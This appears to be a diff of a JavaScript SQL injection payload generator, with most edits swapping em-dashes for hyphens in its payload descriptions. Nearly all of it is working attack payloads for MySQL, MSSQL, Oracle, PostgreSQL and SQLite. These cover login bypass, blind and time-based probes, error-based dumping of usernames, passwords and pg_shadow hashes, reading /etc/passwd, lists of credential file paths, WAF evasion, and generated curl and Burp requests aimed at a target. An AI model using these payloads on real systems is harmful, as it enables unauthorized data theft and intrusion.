-    for(let i=0;i<10;i++) payloads.push({payload:p(`' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT ${colConcatMysql} FROM ${tableTarget} LIMIT ${i},1)))-- -`), desc:`MySQL EXTRACTVALUE — row ${i+1}`});
-    for(let i=0;i<10;i++) payloads.push({payload:p(`' AND UPDATEXML(1,CONCAT(0x7e,(SELECT ${colConcatMysql} FROM ${tableTarget} LIMIT ${i},1)),1)-- -`), desc:`MySQL UPDATEXML — row ${i+1}`});
+    payloads.push({payload:p("' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -"), desc:'MySQL - version'});
+    payloads.push({payload:p("' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))-- -"), desc:'MySQL - current user'});
+    payloads.push({payload:p("' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"), desc:'MySQL - current database'});
+    payloads.push({payload:p("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)))-- -"), desc:'MySQL - all databases'});
+    payloads.push({payload:p("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -"), desc:'MySQL - all tables'});
+    payloads.push({payload:p(`' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='${tableTarget}')))-- -`), desc:`MySQL - columns of ${tableTarget}`});
+    for(let i=0;i<10;i++) payloads.push({payload:p(`' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT ${colConcatMysql} FROM ${tableTarget} LIMIT ${i},1)))-- -`), desc:`MySQL EXTRACTVALUE - row ${i+1}`});
+    for(let i=0;i<10;i++) payloads.push({payload:p(`' AND UPDATEXML(1,CONCAT(0x7e,(SELECT ${colConcatMysql} FROM ${tableTarget} LIMIT ${i},1)),1)-- -`), desc:`MySQL UPDATEXML - row ${i+1}`});
   } else if (dbms==='mssql') {
-    payloads.push({payload:p("' AND 1=CONVERT(INT,(SELECT @@version))-- -"), desc:'MSSQL — version'});
-    payloads.push({payload:p("' AND 1=CONVERT(INT,(SELECT DB_NAME()))-- -"), desc:'MSSQL — current database'});
-    payloads.push({payload:p("' AND 1=CONVERT(INT,(SELECT USER_NAME()))-- -"), desc:'MSSQL — current user'});
-    payloads.push({payload:p("' AND 1=CONVERT(INT,(SELECT SYSTEM_USER))-- -"), desc:'MSSQL — system user'});
-    payloads.push({payload:p("' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sys.databases))-- -"), desc:'MSSQL — first database'});
-    payloads.push({payload:p("' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sys.tables))-- -"), desc:'MSSQL — first table'});
-    payloads.push({payload:p(`' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sys.columns WHERE object_id=OBJECT_ID('${tableTarget}')))-- -`), desc:`MSSQL — first column of ${tableTarget}`});
-    for(let i=0;i<10;i++) payloads.push({payload:p(`' AND 1=CONVERT(INT,(SELECT ${colConcatMssql} FROM ${tableTarget} ORDER BY 1 OFFSET ${i} ROWS FETCH NEXT 1 ROWS ONLY))-- -`), desc:`MSSQL — row ${i+1}`});
-    payloads.push({payload:p("' AND 1=CONVERT(INT,CAST(is_srvrolemember('sysadmin') AS VARCHAR))-- -"), desc:'MSSQL — is sysadmin?'});
+    payloads.push({payload:p("' AND 1=CONVERT(INT,(SELECT @@version))-- -"), desc:'MSSQL - version'});
+    payloads.push({payload:p("' AND 1=CONVERT(INT,(SELECT DB_NAME()))-- -"), desc:'MSSQL - current database'});
+    payloads.push({payload:p("' AND 1=CONVERT(INT,(SELECT USER_NAME()))-- -"), desc:'MSSQL - current user'});
+    payloads.push({payload:p("' AND 1=CONVERT(INT,(SELECT SYSTEM_USER))-- -"), desc:'MSSQL - system user'});
+    payloads.push({payload:p("' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sys.databases))-- -"), desc:'MSSQL - first database'});
+    payloads.push({payload:p("' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sys.tables))-- -"), desc:'MSSQL - first table'});
+    payloads.push({payload:p(`' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sys.columns WHERE object_id=OBJECT_ID('${tableTarget}')))-- -`), desc:`MSSQL - first column of ${tableTarget}`});
+    for(let i=0;i<10;i++) payloads.push({payload:p(`' AND 1=CONVERT(INT,(SELECT ${colConcatMssql} FROM ${tableTarget} ORDER BY 1 OFFSET ${i} ROWS FETCH NEXT 1 ROWS ONLY))-- -`), desc:`MSSQL - row ${i+1}`});
+    payloads.push({payload:p("' AND 1=CONVERT(INT,CAST(is_srvrolemember('sysadmin') AS VARCHAR))-- -"), desc:'MSSQL - is sysadmin?'});
   } else if (dbms==='oracle') {
-    payloads.push({payload:p("' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--"), desc:'Oracle — current user'});
-    payloads.push({payload:p("' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))=1--"), desc:'Oracle — version banner'});
-    for(let i=1;i<=10;i++) payloads.push({payload:p(`' AND 1=utl_inaddr.get_host_name((SELECT table_name FROM (SELECT table_name,rownum rn FROM all_tables) WHERE rn=${i}))--`), desc:`Oracle — table ${i}`});
-    payloads.push({payload:p(`' AND 1=utl_inaddr.get_host_name((SELECT listagg(column_name,',') WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE table_name='${tableTarget.toUpperCase()}'))--`), desc:`Oracle — columns of ${tableTarget}`});
+    payloads.push({payload:p("' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--"), desc:'Oracle - current user'});
+    payloads.push({payload:p("' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))=1--"), desc:'Oracle - version banner'});
+    for(let i=1;i<=10;i++) payloads.push({payload:p(`' AND 1=utl_inaddr.get_host_name((SELECT table_name FROM (SELECT table_name,rownum rn FROM all_tables) WHERE rn=${i}))--`), desc:`Oracle - table ${i}`});
+    payloads.push({payload:p(`' AND 1=utl_inaddr.get_host_name((SELECT listagg(column_name,',') WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE table_name='${tableTarget.toUpperCase()}'))--`), desc:`Oracle - columns of ${tableTarget}`});
   } else if (dbms==='sqlite') {
     payloads.push({payload:p("' AND typeof(1)='integer'-- -"), desc:'SQLite fingerprint'});
     payloads.push({payload:p("' UNION SELECT sqlite_version(),NULL-- -"), desc:'SQLite version'});
@@ -2184,14 +2184,14 @@ function nav(id) {
 // ═══════════════════════════════════════════════
 const DB = {
   discovery:[
-    {payload:"'",desc:"Basic quote — causes syntax error if injectable"},
+    {payload:"'",desc:"Basic quote - causes syntax error if injectable"},
     {payload:'"',desc:"Double quote test"},
     {payload:"'--",desc:"Comment truncation test"},
     {payload:"' OR '1'='1",desc:"OR logic injection test"},
     {payload:"' AND '1'='1",desc:"AND logic test (true)"},
-    {payload:"' AND '1'='2",desc:"AND logic test (false) — page should differ"},
-    {payload:"1 AND 1=1",desc:"Numeric context — true"},
-    {payload:"1 AND 1=2",desc:"Numeric context — false"},
+    {payload:"' AND '1'='2",desc:"AND logic test (false) - page should differ"},
+    {payload:"1 AND 1=1",desc:"Numeric context - true"},
+    {payload:"1 AND 1=2",desc:"Numeric context - false"},
     {payload:"' AND SLEEP(5)-- -",desc:"MySQL time test (wait 5s = injectable)"},
     {payload:"' AND pg_sleep(5)-- -",desc:"PostgreSQL time test"},
     {payload:"'; WAITFOR DELAY '00:00:05'-- -",desc:"MSSQL time test"},
@@ -2203,15 +2203,15 @@ const DB = {
     {payload:"' AND 1=CAST(version() AS INT)-- -",desc:"PostgreSQL error fingerprint"},
     {payload:"' AND 1=CONVERT(INT,@@version)-- -",desc:"MSSQL error fingerprint"},
     {payload:"' AND typeof(1)='integer'-- -",desc:"SQLite fingerprint"},
-    {payload:"'/**/AND/**/1=1-- -",desc:"Comment-as-whitespace — test WAF bypass simultaneously"},
-    {payload:"' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1-- -",desc:"information_schema exists — rules out Oracle & SQLite"},
+    {payload:"'/**/AND/**/1=1-- -",desc:"Comment-as-whitespace - test WAF bypass simultaneously"},
+    {payload:"' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1-- -",desc:"information_schema exists - rules out Oracle & SQLite"},
     {payload:"' AND (SELECT 1 FROM dual)=1-- -",desc:"Oracle DUAL table probe"},
-    {payload:"1; SELECT 1-- -",desc:"Stacked query probe — works MySQL/PgSQL/MSSQL"},
+    {payload:"1; SELECT 1-- -",desc:"Stacked query probe - works MySQL/PgSQL/MSSQL"},
   ],
   auth:[
-    {payload:"' OR '1'='1",desc:"Basic OR bypass — string context"},
+    {payload:"' OR '1'='1",desc:"Basic OR bypass - string context"},
     {payload:"' OR '1'='1'-- -",desc:"OR bypass with comment"},
-    {payload:"admin'-- -",desc:"Comment truncation — bypass password check"},
+    {payload:"admin'-- -",desc:"Comment truncation - bypass password check"},
     {payload:"admin'#",desc:"Hash comment bypass"},
     {payload:"admin') OR ('1'='1",desc:"Parenthesis close + OR"},
     {payload:"' OR 1=1-- -",desc:"Numeric OR bypass"},
@@ -2222,31 +2222,31 @@ const DB = {
     {payload:"' OR 1=1 FROM dual--",desc:"Oracle needs FROM dual in some contexts"},
   ],
   bool:[
-    {payload:"' AND 1=1-- -",desc:"Boolean true — page loads normally"},
-    {payload:"' AND 1=2-- -",desc:"Boolean false — page should differ"},
+    {payload:"' AND 1=1-- -",desc:"Boolean true - page loads normally"},
+    {payload:"' AND 1=2-- -",desc:"Boolean false - page should differ"},
     {payload:"' AND SUBSTRING(username,1,1)='a'-- -",desc:"First char of username is 'a'"},
     {payload:"' AND ASCII(SUBSTRING(username,1,1))>64-- -",desc:"ASCII value > 64"},
     {payload:"' AND LENGTH(username)>5-- -",desc:"Username length > 5"},
     {payload:"' AND (SELECT COUNT(*) FROM users)>0-- -",desc:"users table has rows"},
-    {payload:"' AND IF(1=1,1,0)-- -",desc:"IF conditional — true path"},
-    {payload:"' AND (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)=1-- -",desc:"CASE WHEN boolean — all DBs"},
+    {payload:"' AND IF(1=1,1,0)-- -",desc:"IF conditional - true path"},
+    {payload:"' AND (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)=1-- -",desc:"CASE WHEN boolean - all DBs"},
   ],
   time_mysql:[
-    {payload:"' AND SLEEP(5)-- -",desc:"MySQL — 5s delay if injectable"},
+    {payload:"' AND SLEEP(5)-- -",desc:"MySQL - 5s delay if injectable"},
     {payload:"' OR SLEEP(5)-- -",desc:"OR-based sleep"},
-    {payload:"' AND IF(1=1,SLEEP(5),0)-- -",desc:"Conditional sleep — true"},
+    {payload:"' AND IF(1=1,SLEEP(5),0)-- -",desc:"Conditional sleep - true"},
     {payload:"' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -",desc:"Sleep if DB starts with 'a'"},
-    {payload:"' AND IF(ASCII(SUBSTRING(database(),1,1))>109,SLEEP(5),0)-- -",desc:"Binary search — upper half"},
-    {payload:"' AND BENCHMARK(10000000,SHA1(1))-- -",desc:"BENCHMARK() CPU delay — alternative to SLEEP()"},
+    {payload:"' AND IF(ASCII(SUBSTRING(database(),1,1))>109,SLEEP(5),0)-- -",desc:"Binary search - upper half"},
+    {payload:"' AND BENCHMARK(10000000,SHA1(1))-- -",desc:"BENCHMARK() CPU delay - alternative to SLEEP()"},
   ],
   time_pgsql:[
-    {payload:"' AND pg_sleep(5)-- -",desc:"PostgreSQL — 5s delay"},
+    {payload:"' AND pg_sleep(5)-- -",desc:"PostgreSQL - 5s delay"},
     {payload:"'; SELECT pg_sleep(5)-- -",desc:"Stacked query"},
     {payload:"' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -",desc:"Conditional sleep"},
     {payload:"' AND (SELECT CASE WHEN (current_user='postgres') THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -",desc:"Sleep if running as postgres"},
   ],
   time_mssql:[
-    {payload:"'; WAITFOR DELAY '00:00:05'-- -",desc:"MSSQL — 5s delay"},
+    {payload:"'; WAITFOR DELAY '00:00:05'-- -",desc:"MSSQL - 5s delay"},
     {payload:"' AND WAITFOR DELAY '00:00:05'-- -",desc:"AND-based"},
     {payload:"' IF(1=1) WAITFOR DELAY '00:00:05'-- -",desc:"Conditional wait"},
     {payload:"'; IF(SYSTEM_USER='sa') WAITFOR DELAY '00:00:05'-- -",desc:"Sleep if logged in as SA"},
@@ -2260,45 +2260,45 @@ const DB = {
     {payload:"' AND typeof(randomblob(500000000))='blob'-- -",desc:"Conditional randomblob"},
   ],
   error_mysql:[
-    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))-- -",desc:"EXTRACTVALUE — DB version"},
-    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,user(),0x7e))-- -",desc:"EXTRACTVALUE — current user"},
-    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))-- -",desc:"EXTRACTVALUE — current database"},
-    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),0x7e))-- -",desc:"EXTRACTVALUE — all databases"},
-    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- -",desc:"EXTRACTVALUE — all tables"},
-    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e))-- -",desc:"EXTRACTVALUE — first table name"},
-    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x7e))-- -",desc:"EXTRACTVALUE — first column in users"},
-    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 0,1),0x7e))-- -",desc:"EXTRACTVALUE — first user:pass"},
-    {payload:"' AND UPDATEXML(1,CONCAT(0x7e,version(),0x7e),1)-- -",desc:"UPDATEXML — version"},
-    {payload:"' AND UPDATEXML(1,CONCAT(0x7e,user(),0x7e),1)-- -",desc:"UPDATEXML — current user"},
-    {payload:"' AND UPDATEXML(1,CONCAT(0x7e,database(),0x7e),1)-- -",desc:"UPDATEXML — database name"},
-    {payload:"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)-- -",desc:"UPDATEXML — all tables"},
+    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))-- -",desc:"EXTRACTVALUE - DB version"},
+    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,user(),0x7e))-- -",desc:"EXTRACTVALUE - current user"},
+    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))-- -",desc:"EXTRACTVALUE - current database"},
+    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),0x7e))-- -",desc:"EXTRACTVALUE - all databases"},
+    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- -",desc:"EXTRACTVALUE - all tables"},
+    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e))-- -",desc:"EXTRACTVALUE - first table name"},
+    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x7e))-- -",desc:"EXTRACTVALUE - first column in users"},
+    {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 0,1),0x7e))-- -",desc:"EXTRACTVALUE - first user:pass"},
+    {payload:"' AND UPDATEXML(1,CONCAT(0x7e,version(),0x7e),1)-- -",desc:"UPDATEXML - version"},
+    {payload:"' AND UPDATEXML(1,CONCAT(0x7e,user(),0x7e),1)-- -",desc:"UPDATEXML - current user"},
+    {payload:"' AND UPDATEXML(1,CONCAT(0x7e,database(),0x7e),1)-- -",desc:"UPDATEXML - database name"},
+    {payload:"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)-- -",desc:"UPDATEXML - all tables"},
     {payload:"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",desc:"FLOOR+RAND duplicate key error"},
     {payload:"' AND exp(~(SELECT * FROM (SELECT user())a))-- -",desc:"EXP overflow error"},
   ],
   error_pgsql:[
-    {payload:"' AND 1=CAST((SELECT version()) AS INT)-- -",desc:"PostgreSQL CAST error — version"},
-    {payload:"' AND 1=CAST((SELECT current_database()) AS INT)-- -",desc:"CAST — database name"},
-    {payload:"' AND 1=CAST((SELECT usename FROM pg_user LIMIT 1) AS INT)-- -",desc:"CAST — username"},
-    {payload:"' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS INT)-- -",desc:"CAST — all public tables"},
-    {payload:"' AND 1=CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users') AS INT)-- -",desc:"CAST — columns of users"},
-    {payload:"' AND 1=CAST((SELECT string_agg(usename||':'||passwd,',') FROM pg_shadow LIMIT 10) AS INT)-- -",desc:"CAST — pg_shadow hashes (superuser)"},
-    {payload:"' AND 1=CAST(pg_read_file('/etc/passwd',0,500) AS INT)-- -",desc:"CAST + pg_read_file — read /etc/passwd"},
+    {payload:"' AND 1=CAST((SELECT version()) AS INT)-- -",desc:"PostgreSQL CAST error - version"},
+    {payload:"' AND 1=CAST((SELECT current_database()) AS INT)-- -",desc:"CAST - database name"},
+    {payload:"' AND 1=CAST((SELECT usename FROM pg_user LIMIT 1) AS INT)-- -",desc:"CAST - username"},
+    {payload:"' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS INT)-- -",desc:"CAST - all public tables"},
+    {payload:"' AND 1=CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users') AS INT)-- -",desc:"CAST - columns of users"},
+    {payload:"' AND 1=CAST((SELECT string_agg(usename||':'||passwd,',') FROM pg_shadow LIMIT 10) AS INT)-- -",desc:"CAST - pg_shadow hashes (superuser)"},
+    {payload:"' AND 1=CAST(pg_read_file('/etc/passwd',0,500) AS INT)-- -",desc:"CAST + pg_read_file - read /etc/passwd"},
   ],
   error_mssql:[
-    {payload:"' AND 1=CONVERT(INT,(SELECT @@version))-- -",desc:"MSSQL CONVERT — version"},
-    {payload:"' AND 1=CONVERT(INT,(SELECT DB_NAME()))-- -",desc:"CONVERT — current database"},
-    {payload:"' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sys.databases))-- -",desc:"CONVERT — first database"},
-    {payload:"' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sys.tables))-- -",desc:"CONVERT — first table"},
-    {payload:"' AND 1=CONVERT(INT,(SELECT USER_NAME()))-- -",desc:"CONVERT — current user"},
-    {payload:"' AND 1=CONVERT(INT,(SELECT SYSTEM_USER))-- -",desc:"CONVERT — system user"},
+    {payload:"' AND 1=CONVERT(INT,(SELECT @@version))-- -",desc:"MSSQL CONVERT - version"},
+    {payload:"' AND 1=CONVERT(INT,(SELECT DB_NAME()))-- -",desc:"CONVERT - current database"},
+    {payload:"' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sys.databases))-- -",desc:"CONVERT - first database"},
+    {payload:"' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sys.tables))-- -",desc:"CONVERT - first table"},
+    {payload:"' AND 1=CONVERT(INT,(SELECT USER_NAME()))-- -",desc:"CONVERT - current user"},
+    {payload:"' AND 1=CONVERT(INT,(SELECT SYSTEM_USER))-- -",desc:"CONVERT - system user"},
     {payload:"' AND 1=CONVERT(INT,CAST(is_srvrolemember('sysadmin') AS VARCHAR))-- -",desc:"Is sysadmin?"},
   ],
   error_oracle:[
-    {payload:"' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",desc:"Oracle UTL_INADDR error — version"},
+    {payload:"' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",desc:"Oracle UTL_INADDR error - version"},
     {payload:"' AND CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",desc:"Oracle CTXSYS error"},
     {payload:"' AND 1=XMLTYPE((SELECT CONCAT('~',banner) FROM v$version WHERE ROWNUM=1))-- -",desc:"Oracle XMLTYPE error"},
-    {payload:"' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))-- -",desc:"UTL_INADDR — current Oracle user"},
-    {payload:"' AND 1=utl_inaddr.get_host_name((SELECT table_name FROM all_tables WHERE rownum=1))-- -",desc:"UTL_INADDR — first table"},
+    {payload:"' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))-- -",desc:"UTL_INADDR - current Oracle user"},
+    {payload:"' AND 1=utl_inaddr.get_host_name((SELECT table_name FROM all_tables WHERE rownum=1))-- -",desc:"UTL_INADDR - first table"},
   ],
   error_sqlite:[
     {payload:"' AND typeof(1)='x'-- -",desc:"SQLite type error fingerprint"},
@@ -2325,8 +2325,8 @@ const DB = {
     {payload:"/etc/nginx/nginx.conf",desc:"Nginx config"},
     {payload:"/etc/mysql/my.cnf",desc:"MySQL config"},
     {payload:"/var/www/html/config.php",desc:"Config file"},
-    {payload:"/var/www/html/wp-config.php",desc:"WordPress config — DB credentials"},
-    {payload:"/var/www/html/.env",desc:".env file — secrets"},
+    {payload:"/var/www/html/wp-config.php",desc:"WordPress config - DB credentials"},
+    {payload:"/var/www/html/.env",desc:".env file - secrets"},
     {payload:"/var/log/apache2/error.log",desc:"Apache error log"},
     {payload:"C:/Windows/win.ini",desc:"Windows config file"},
     {payload:"C:/inetpub/wwwroot/web.config",desc:"IIS web config"},
@@ -2334,10 +2334,10 @@ const DB = {
   waf_bypass:[
     {payload:"-- -",desc:"MySQL double dash comment",tags:[{c:"green",l:"comment"}]},
     {payload:"#",desc:"MySQL hash comment",tags:[{c:"green",l:"comment"}]},
-    {payload:"/**/",desc:"Inline comment — whitespace substitute",tags:[{c:"blue",l:"whitespace"}]},
+    {payload:"/**/",desc:"Inline comment - whitespace substitute",tags:[{c:"blue",l:"whitespace"}]},
     {payload:"/*!50000UNION*/",desc:"Version-conditional comment",tags:[{c:"amber",l:"obfuscation"}]},
-    {payload:"%09",desc:"Tab character — whitespace substitute",tags:[{c:"blue",l:"whitespace"}]},
-    {payload:"%0a",desc:"Newline — whitespace substitute",tags:[{c:"blue",l:"whitespace"}]},
+    {payload:"%09",desc:"Tab character - whitespace substitute",tags:[{c:"blue",l:"whitespace"}]},
+    {payload:"%0a",desc:"Newline - whitespace substitute",tags:[{c:"blue",l:"whitespace"}]},
     {payload:"SeLeCt * FrOm users",desc:"Random case",tags:[{c:"purple",l:"case"}]},
     {payload:"UNION/**/SELECT",desc:"Comment breaks keyword",tags:[{c:"cyan",l:"break"}]},
     {payload:"UN/**/ION SE/**/LECT",desc:"Split-word comment injection",tags:[{c:"cyan",l:"break"}]},
@@ -2347,7 +2347,7 @@ const DB = {
     {payload:"' OR 1 BETWEEN 1 AND 1-- -",desc:"BETWEEN instead of =",tags:[{c:"purple",l:"operator"}]},
     {payload:"' OR '1' LIKE '1'-- -",desc:"LIKE instead of =",tags:[{c:"purple",l:"operator"}]},
     {payload:"' UNION ALL SELECT 1,2,3-- -",desc:"UNION ALL vs UNION",tags:[{c:"cyan",l:"keyword"}]},
-    {payload:"' OR EXISTS(SELECT 1)-- -",desc:"EXISTS subquery — always true",tags:[{c:"purple",l:"subquery"}]},
+    {payload:"' OR EXISTS(SELECT 1)-- -",desc:"EXISTS subquery - always true",tags:[{c:"purple",l:"subquery"}]},
   ],
   priv:[
     {payload:"SELECT USER()",desc:"Current MySQL user"},
@@ -2453,7 +2453,7 @@ const DBMS_META = {
 };
 
 // ═══════════════════════════════════════════════
-// UEH — UNIVERSAL ENUM HELPER (9 steps 0-8)
+// UEH - UNIVERSAL ENUM HELPER (9 steps 0-8)
 // ═══════════════════════════════════════════════
 let uehState = {step: 0};
 
@@ -2551,13 +2551,13 @@ function renderUehStep(step) {
     const chainPayloads = genCastChain(params, cfg.targetParamIdx, cfg.dbms, cfg.table||'users', cfg.targetCols||'username,password');
     const curlPayloads = chainPayloads.slice(0,10).map(p=>({
       payload: `curl -s -X POST "${cfg.url||'http://TARGET/page.php'}" -d '${p.payload}'`,
-      desc: `cURL — ${p.desc}`
+      desc: `cURL - ${p.desc}`
     }));
     html += `<div class="card"><div class="card-header"><div class="card-title">📋 Step 8: Full Burp Body Payloads</div>${pillHtml}</div><div class="card-body">
       <div class="info-box success"><strong>Complete body strings ready to paste into Burp Repeater.</strong><br>Target: <code style="font-family:var(--mono)">${esc(cfg.table||'users')}</code> | Columns: <code style="font-family:var(--mono)">${esc(cfg.targetCols||'username,password')}</code> | Param Index: ${cfg.targetParamIdx}</div>
       ${params.length===0 ? '<div class="info-box warn">⚠️ No form body detected. Go to Step 0 and paste your Burp body first.</div>' : ''}
     </div></div>
-    ${buildSection(`CAST/CONVERT Chain — ${meta.name}`, chainPayloads)}
+    ${buildSection(`CAST/CONVERT Chain - ${meta.name}`, chainPayloads)}
     ${buildSection('cURL Commands', curlPayloads)}`;
   } else {
     // STANDARD STEPS 1-7
@@ -2601,15 +2601,15 @@ function buildUehStepPayloads(step, cfg, meta) {
       // ORDER BY method
       payloads.push({payload:'━━━ METHOD A: ORDER BY (increment until error) ━━━',desc:''});
       for(let i=1;i<=Math.min(30,cols+8);i++)
-        payloads.push({payload:`${prefix} ORDER BY ${i} ${comment}`,desc:`ORDER BY ${i} — error here means ${i-1} columns`});
+        payloads.push({payload:`${prefix} ORDER BY ${i} ${comment}`,desc:`ORDER BY ${i} - error here means ${i-1} columns`});
       // UNION NULL method
       payloads.push({payload:'━━━ METHOD B: UNION SELECT NULL (increment until no error) ━━━',desc:''});
       for(let i=1;i<=Math.min(20,cols+5);i++)
-        payloads.push({payload:`${prefix} UNION SELECT ${Array(i).fill('NULL').join(',')} ${comment}`,desc:`${i} NULLs — no error = ${i} columns`});
+        payloads.push({payload:`${prefix} UNION SELECT ${Array(i).fill('NULL').join(',')} ${comment}`,desc:`${i} NULLs - no error = ${i} columns`});
       // UNION numbers
       payloads.push({payload:'━━━ METHOD C: UNION SELECT numbers (spot visible columns) ━━━',desc:''});
       for(let i=1;i<=Math.min(12,cols+3);i++)
-        payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:i},(_,j)=>j+1).join(',')} ${comment}`,desc:`${i} columns with numbers — visible number reveals position`});
+        payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:i},(_,j)=>j+1).join(',')} ${comment}`,desc:`${i} columns with numbers - visible number reveals position`});
       // WAF bypass variants
       payloads.push({payload:'━━━ METHOD D: WAF Bypass Variants ━━━',desc:''});
       payloads.push({payload:`${prefix}/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL ${comment}`,desc:'Comment-as-space bypass'});
@@ -2622,26 +2622,26 @@ function buildUehStepPayloads(step, cfg, meta) {
     // ══════════════════════════════════════════════════════
     case 2: {
       title = '👁 Step 2: Find Visible Columns';
-      notes = 'Set "Visible Col" in config after finding which position renders on screen. Try strings AND integers — some columns only accept one type.';
+      notes = 'Set "Visible Col" in config after finding which position renders on screen. Try strings AND integers - some columns only accept one type.';
       payloads.push({payload:'━━━ All numbers simultaneously (quickest) ━━━',desc:''});
-      payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1).join(',')} ${comment}`,desc:`Numbers 1-${cols} — look for any visible number`});
-      payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>`'C${i+1}'`).join(',')} ${comment}`,desc:`String markers C1-C${cols} — look for any marker in response`});
+      payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1).join(',')} ${comment}`,desc:`Numbers 1-${cols} - look for any visible number`});
+      payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>`'C${i+1}'`).join(',')} ${comment}`,desc:`String markers C1-C${cols} - look for any marker in response`});
       payloads.push({payload:'━━━ One column at a time (precise) ━━━',desc:''});
       for(let i=1;i<=cols;i++) {
         const pStr = Array.from({length:cols},(_,j)=>j+1===i?`'COL${i}'`:`${j+1}`).join(',');
-        payloads.push({payload:`${prefix} UNION SELECT ${pStr} ${comment}`,desc:`String in column ${i} — look for "COL${i}" in response`});
+        payloads.push({payload:`${prefix} UNION SELECT ${pStr} ${comment}`,desc:`String in column ${i} - look for "COL${i}" in response`});
       }
       // NULL+string combos
       payloads.push({payload:'━━━ NULL+marker (type-safe for strict DBs) ━━━',desc:''});
       for(let i=1;i<=cols;i++) {
         const pNull = Array.from({length:cols},(_,j)=>j+1===i?`'SQLI_MARKER'`:'NULL').join(',');
-        payloads.push({payload:`${prefix} UNION SELECT ${pNull} ${comment}`,desc:`NULL everywhere except col ${i} — strict type check`});
